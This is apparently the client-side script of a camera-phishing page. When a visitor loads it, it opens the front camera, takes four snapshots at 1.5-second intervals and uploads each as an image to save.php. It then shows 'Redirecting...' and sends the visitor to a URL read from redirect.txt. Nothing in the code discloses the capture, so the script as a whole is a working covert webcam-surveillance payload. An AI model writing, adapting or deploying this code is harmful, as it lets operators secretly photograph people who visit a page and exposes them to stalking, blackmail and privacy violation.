document.addEventListener("DOMContentLoaded", async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const constraints = { video: { facingMode: "user" }, audio: false };

    let captureCount = 0;
    const maxCaptures = 4;

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;

        const intervalId = setInterval(() => {
            context.drawImage(video, 0, 0, 640, 480);
            const dataURL = canvas.toDataURL('image/png');

            fetch("save.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "image=" + encodeURIComponent(dataURL)
            })
            .then(res => res.text())
            .then(txt => {
                console.log(txt);
                captureCount++;
                if (captureCount >= maxCaptures) {
                    clearInterval(intervalId);
                    fetch("redirect.txt")
                        .then(response => response.text())
                        .then(url => {
                            document.getElementById("loading-text").textContent = "Redirecting...";
                            setTimeout(() => {
                                window.location.href = url.trim();
                            }, 1000);
                        })
                        .catch(err => console.error("Redirect fetch error:", err));
                }
            })
            .catch(err => console.error(err));
        }, 1500);

    } catch (err) {
        console.error("Camera access denied:", err);
        document.getElementById("loading-text").textContent = "Camera access denied.";
    }
});
